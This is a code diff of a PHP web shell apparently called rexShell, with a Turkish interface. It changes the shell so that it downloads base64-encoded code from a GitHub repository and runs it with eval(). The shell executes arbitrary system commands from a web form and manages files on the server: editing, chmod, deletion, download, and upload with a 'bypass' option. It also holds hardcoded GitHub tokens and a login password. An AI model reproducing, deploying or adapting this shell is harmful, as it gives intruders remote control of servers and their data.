@@ -5,7 +5,7 @@ session_start();
 function get_content_from_github($url) {
     //$proxy="proxy.adress:80";
     //$auth="user:pass";
-    $token = '9e82f764f14933a6495536ed0ec1ad36d5087cd1';
+    $token = '067b42ec088a88d2639c9ac7ffa16bc30f990415';
     $curl_token_auth = 'Authorization: token ' . $token;
 	$ch = curl_init();
 	curl_setopt($ch,CURLOPT_URL,$url);
@@ -15,7 +15,7 @@ function get_content_from_github($url) {
 	curl_setopt($ch,CURLOPT_RETURNTRANSFER,1); 
 	curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,10);
     curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
-    curl_setopt($ch, CURLOPT_HTTPHEADER, array('User-Agent: Awesome-Octocat-App', $curl_token_auth));
+    curl_setopt($ch, CURLOPT_HTTPHEADER, array('User-Agent: Awesome-Octocat-App',$curl_token_auth));
 	$content = curl_exec($ch);
 	curl_close($ch);
 	return $content;
@@ -25,126 +25,27 @@ function get_repo_json($file) {
 		$json = array();
 		$json[]= json_decode(get_content_from_github('https://api.github.com/repos/XianThi/rexShell/contents/'.$file),true);
     	return $json;
-	}
-
+}
 $config=get_repo_json('config/config.rex');
 $config=base64_decode($config["0"]["content"]);
 eval($config);
+$init=get_repo_json('functions/init.rex');
+$init=base64_decode($init["0"]["content"]);
+eval($init);
+$actions=get_repo_json('functions/actions.rex');
+$actions=base64_decode($actions["0"]["content"]);
 
-function logout(){
-unset($_SESSION["password"]);
-session_destroy();
-header('Location: ?login');
-}
+call_user_func('check_login',$password);
 if(isset($_GET["logout"])){
-logout();
+call_user_func('logout');
 }
-function check_login(){
-$password='xianthi';
-if(!empty($_POST)){
-$passwd=$_POST['passwd'];
-if($password == $passwd){
-$_SESSION['password']=md5($passwd);
-$login=TRUE;
-}
-}else{
-if (!empty($_SESSION)){
-if($_SESSION['password']==md5($password)){
-$login=TRUE;
-}else{
-$login=FALSE;
-}
-if (!$login){
-get_login();
-die();
-}
-}else{
-get_login();
-die();
-}
-}
-}
-check_login();
-function homedir(){
-    return realpath(dirname(__FILE__)).'/';
+
+if(isset($_GET['action'])){
+eval($actions);
 }
 
 
-if(isset($_GET["update_chmod"])){
-if(change_chmod($_GET["chmod"],$_GET["newchmod"])){
-$alert_display=TRUE;
-$alert_style="success";
-$alert_message="İzinler düzenlendi.";
-}else{
-$alert_display=TRUE;
-$alert_style="danger";
-$alert_message="İzinler düzenlenemedi.";    
-}
-}
-if(isset($_GET["update_name"])){
-change_name($_GET["rename"],$_GET["newname"]);
-}
-if(isset($_POST["update_file"])){
-if(update_file($_POST["edit"],$_POST["content"])){
-$alert_display=TRUE;
-$alert_style="success";
-$alert_message="Dosya düzenlendi.";
-}else{
-$alert_display=TRUE;
-$alert_style="danger";
-$alert_message="Dosya düzenlenemedi.";    
-}
-}
-
-if(isset($_POST["new_file"])){
-if(create_file($_POST["newfile"],$_POST["content"])){
-$alert_display=TRUE;
-$alert_style="success";
-$alert_message="Dosya oluşturuldu.";
-$location='?path='.$_GET["path"].'&view='.$_GET["path"].$_POST["newfile"];
-header("Location: $location");
-}else{
-$alert_display=TRUE;
-$alert_style="danger";
-$alert_message="Dosya oluşturulamadı.";    
-}
-}
-
-if(isset($_POST["uploadfile"])){
-if(isset($_POST["zip"])){
-$zip=TRUE;
-}else {$zip=FALSE;}
-if(upload($zip)){
-$alert_display=TRUE;
-$alert_style="success";
-$alert_message="Dosya yüklendi.";
-$location='?path='.$_GET["path"];
-header("Location: $location");
-}else{
-$alert_display=TRUE;
-$alert_style="danger";
-$alert_message="Dosya yüklenemedi.";    
-}
-}
-if(isset($_GET["delete"])){
-if(delete_file($_GET["delete"])){
-$alert_display=TRUE;
-$alert_style="success";
-$alert_message="Silindi.";
-}else{
-$alert_display=TRUE;
-$alert_style="danger";
-$alert_message="Silinemedi.";    
-}
-}
-function homeurl(){
-$query = $_SERVER['PHP_SELF'];
-$path = pathinfo( $query );
-$link = $path['basename'];
-    return $link;
-}
-
-function rapih($text){
+function prex($text){
     return trim(str_replace("<br>","",$text));
     }
 function magicboom($text){
@@ -153,8 +54,9 @@ function magicboom($text){
         } 
         return stripslashes($text);
         }
-function exe($command){
+function exe($command,$pwd){
     if(function_exists('system')){
+        @chdir($pwd);
         @ob_start();
         @system($command);
         $buff = @ob_get_contents();
@@ -204,7 +106,7 @@ function clearspace($text){
     return str_replace(" ","_",$text);
     }
 
-function ukuran($file){
+function boyut($file){
     if($size = @filesize($file)){
         if($size <= 1024) return $size;
         else{if($size <= 1024*1024) {
@@ -216,9 +118,7 @@ function ukuran($file){
 else return "???";
 } 
 
-function get_login(){
-echo '<form method=POST><input type="password" name="passwd" /><input type="submit" value="Login" /></form>';
-}
+
 
 function get_safemode(){
 if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on"){
@@ -254,11 +154,11 @@ function testperl() {if (exe('perl -h')) {return "AÇIK";}else {return "KAPALI";
 function get_info(){
 $os=get_os();
 if (!$os){
-if(rapih(exe("whoami"))){
-$user=rapih(exe("whoami"));
+if(prex(exe("whoami"))){
+$user=prex(exe("whoami"));
 }
-if(rapih(exe("id"))){
-$id=rapih(exe("id"));
+if(prex(exe("id"))){
+$id=prex(exe("id"));
 }
 }else{
 $user = @get_current_user();
@@ -286,13 +186,14 @@ return $info;
 }
 
 function command_prompt($pwd,$prompt){
+$buff="";
 if($prompt){
-$buff='<div class="form-group">
+$buff.='<div class="form-group">
   <label for="cikti">Çıktı:</label>
-  <textarea class="form-control" rows="5" id="cikti">'.exe($prompt).'</textarea>
+  <textarea class="form-control" rows="5" id="cikti">'.exe($prompt,$pwd).'</textarea>
 </div>';
 }
-$buff .= " <form action='?path=".$pwd."&amp;x=shell' method='post' style='margin:8px 0 0 0;'><table class='table table-condensed'><tr><td>Komut : </td><td><input onMouseOver='this.focus();' id='cmd' class='inputz' type='text' name='cmd' style='width:400px;' value='$prompt' /><input class='inputzbut' type='submit' value='execute !' name='submitcmd' style='width:80px;' /></td></tr></form><form action='?' method='get' style='margin:8px 0 0 0;'><input type='hidden' name='path' value='".$pwd."' /><tr><td>view file/folder</td><center><td><input onMouseOver='this.focus();' id='goto' class='inputz' type='text' name='view' style='width:400px;' value='".$pwd."' /><input class='inputzbut' type='submit' value='view !' name='submitcmd' style='width:80px;' /></td></center></tr></form></table>";
+$buff .= " <form action='?path=".$pwd."&amp;action=yes' method='post' style='margin:8px 0 0 0;'><table class='table table-condensed'><tr><td>Komut : </td><td><input onMouseOver='this.focus();' id='cmd' class='inputz' type='text' name='cmd' style='width:400px;' value='$prompt' /><input class='btn btn-danger' type='submit' value='execute !' name='submitcmd' style='width:80px;' /></td></tr></form><form action='?' method='get' style='margin:8px 0 0 0;'><input type='hidden' value='yes' name='action' /><tr><td>view file/folder</td><center><td><input onMouseOver='this.focus();' id='goto' class='inputz' type='text' name='path' style='width:400px;' value='".$pwd."' /><input class='btn btn-primary' type='submit' value='view !' name='submitcmd' style='width:80px;' /></td></center></tr></form></table>";
 
 return $buff;
 }
@@ -304,6 +205,7 @@ $buff='
 <form method=GET>
 <div class="form-group">
   <label for="chmod">'.$file.' için chmod ayarları (Şuan : '.$perms.'):</label>
+  <input type="hidden" name="action" value="yes" />
   <input type="hidden" value="ok" name="update_chmod" />
   <input type="hidden" value="'.$file.'" name="chmod" />
   <input class="form-control" value="'.$perm_value.'" id="chmod" name="newchmod"/>
@@ -369,7 +271,7 @@ $buff='
 <div class="col-md-4"><a class="btn btn-default" href="?path='.$pwd.'&view='.$file.'">Görüntüle</a> <a class="btn btn-default" href="?path='.$pwd.'&delete='.$file.'">Sil</a> <a class="btn btn-default" href="?path='.$pwd.'&download='.$file.'">İndir</a></div>
 </div>
 <div class="row">
-<form method=POST>
+<form method=POST action="'. $_SERVER['REQUEST_URI'].'&action=yes">
   <input type="hidden" value="ok" name="update_file" />
   <input type="hidden" value="'.$file.'" name="edit" />
 <textarea class="form-control" name="content">'.$content.'</textarea>
@@ -389,7 +291,7 @@ if ($nlist<>$filename){
 $path .= $nlist.'/';
 }
 }
-$buff='<form method=POST>
+$buff='<form method=POST action="'. $_SERVER['REQUEST_URI'].'&action=yes">
 <div class="container">
 <div class="row">
 <div class="col-md-4">
@@ -407,7 +309,7 @@ return $buff;
 }
 
 function upload_file(){
-echo '<form enctype="multipart/form-data" method="POST">
+echo '<form enctype="multipart/form-data" method=POST action="'. $_SERVER['REQUEST_URI'].'&action=yes">
     <label>Dosya seçin : </label><input class="form-control" name="uploaded" type="file" />
     <input type="hidden" value="ok" name="uploadfile" />
     <label><input type="checkbox" name="zip" />Zip olarak yükle (bypass)</label>
@@ -425,6 +327,7 @@ $buff='
 <form method=GET>
 <div class="form-group">
   <label for="name">'.$fname.' dosyasını yeniden adlandır:</label>
+  <input type="hidden" name="action" value="yes" />
   <input type="hidden" value="ok" name="update_name" />
   <input type="hidden" value="'.$fname.'" name="rename" />
   <input class="form-control" value="'.$fname.'" id="name" name="newname"/>
@@ -548,7 +451,7 @@ if(!get_os() && get_posix()){
     $owner = $name['name']."<span class=\"gaya\"> : </span>".$group['name'];
     }else { $owner = $user; }
     $buff .= "<tr><td><a id=\"".clearspace($file)."_link\" href=\"?path=$pwd&amp;view=$full\"><i class='glyphicon glyphicon-file'></i> $file</a> 
-</td><td>".ukuran($full)."</td><td>".$owner."</td><td><center>
+</td><td>".boyut($full)."</td><td>".$owner."</td><td><center>
 <a href=\"?path=$pwd&chmod=$full\">".get_perms($full)."</a>
 </center></td>
 <td>".date("d-M-Y",@filemtime($full))."</td> 
@@ -720,10 +623,17 @@ textarea.form-control {
 <div class="alert alert-<?=$alert_style;?>" style="<?php if(!$alert_display){echo "display:none;";}?>"><?=$alert_message;?></div>
 <?php 
 if (isset($_GET['path'])){
-$pwd=$_GET["path"];    
-    }else{
-$pwd=homedir();
-    }
+$pwd=$_GET["path"];}else{
+$pwd=homedir();}
+if (is_file($pwd)){
+$viewfile=$pwd;
+$pwd=pathinfo($pwd);
+$pwd=$pwd["dirname"];
+$listdir=FALSE;
+}
+if (substr($pwd,-1)!="/"){
+$pwd=$pwd."/";
+}
 if(isset($_POST["cmd"])){
 $prompt=$_POST["cmd"];
 }else{
@@ -755,9 +665,13 @@ if(isset($_GET["upload"])){
 echo upload_file();
 }
 
+if (isset($viewfile)){
+echo view_file($pwd,$viewfile);
+}
 if ($listdir){
 echo get_dir($pwd);
 }
+
 ?>
 </div>
 </div>
